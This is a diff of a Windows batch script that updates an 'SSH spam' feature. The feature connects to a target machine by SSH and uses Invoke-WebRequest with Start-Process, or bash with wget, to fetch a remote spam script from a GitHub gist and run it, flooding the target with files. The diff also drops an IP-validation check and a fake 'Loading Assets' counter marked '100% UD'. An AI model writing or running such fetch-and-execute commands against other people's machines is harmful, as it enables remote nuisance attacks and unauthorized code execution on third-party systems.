@@ -5,6 +5,7 @@
 ::    Try to Add a Interaktive CLI Interface, which can be dynamicly called and used by other Scripts. 
 ::    Add Translation / make multiple Versions in one Script / Setup.exe Include mutliple Files
 ::    Add FTP support
+::    Fix SSH Spam
 
 :!top
     @echo off
@@ -571,7 +572,7 @@
     If %menu4% == 5 goto settings.logging
     If %menu4% == 6 goto experimental.features
     If %menu4% == 7 goto restart.script
-    If %menu4% == 8 goto start.with.arguments
+    If %menu4% == 8 goto start.with.argument
     If %menu4% == 9 goto menu
     goto settings
 
@@ -1263,36 +1264,14 @@
     ) else (
         goto ssh.spam.setup
     )
-:ssh.spam.setup
-    :: Check if IP is valid
-    setlocal enabledelayedexpansion
-    echo !ssh-ip! | findstr /R "^([0-9]{1,3}\.){3}[0-9]{1,3}$"
-    if %errorlevel% equ 0 (
-        goto ssh.spam.setup.2
-    ) else (
-        echo The IP you entered doesnt seem Valid. Please try again.
-        pause
-        goto ssh.spam.info
-    )
 
-:ssh.spam.setup.2
+:ssh.spam.setup
     :: Enter other things needed for Remotespam
     set /P ssh-name=Enter an Account Name:
     rem set /P ssh-pswd=Enter the Password of the Account:
     set /P ssh-filecount=How many files do you want to create:
     call :sys.verify.execution
     cls
-
-:start.ssh
-    :: 100% UD ASSET COUNTER (Does nothing)
-    set "assetcount=1"
-    :assetcounttop
-    color 02
-    @ping -n 1 localhost> nul
-    echo Loading Assets [%assetcount%/32]
-    set /a "assetcount+=1"
-    cls
-    If %assetcount% == 33 (goto ssh.start.spam) else (goto assetcounttop)
 
 :ssh.start.spam
     echo Is the SSH Target based on Linux or Windows?
@@ -1303,20 +1282,23 @@
     echo.
     echo.
     set /P linux-win-ssh=Choose an Option from Above:
-    if %linux-win-ssh% == 1 goto ssh.start.spam
+    if %linux-win-ssh% == 1 goto spam.ssh.target.win
     if %linux-win-ssh% == 2 goto spam.ssh.target.lx
+    goto ssh.start.spam
 
 :spam.ssh.target.win
     if %logging% == 1 ( call :log Spamming_Windows_SSH_Target )
-    set ssh_command="Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%"
-    ssh %ssh-name%@%ssh-ip% "powershell -Command %ssh_command%"
+    set ssh_command=Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%
+    ssh %ssh-name%@%ssh-ip% powershell -Command "%ssh_command%"
+    color 02
     echo Successfully executed SSH Connection.
     goto ssh.done
 
 :spam.ssh.target.lx
     if %logging% == 1 ( call :log Spamming_Linux_SSH_Target )
-    set ssh_command="bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%"
-    ssh %ssh-name%@%ssh-ip% "%ssh_command%"
+    set ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%
+    ssh %ssh-name%@%ssh-ip% %ssh_command%
+    color 02
     echo Successfully executed SSH Connection.
     goto ssh.done
 
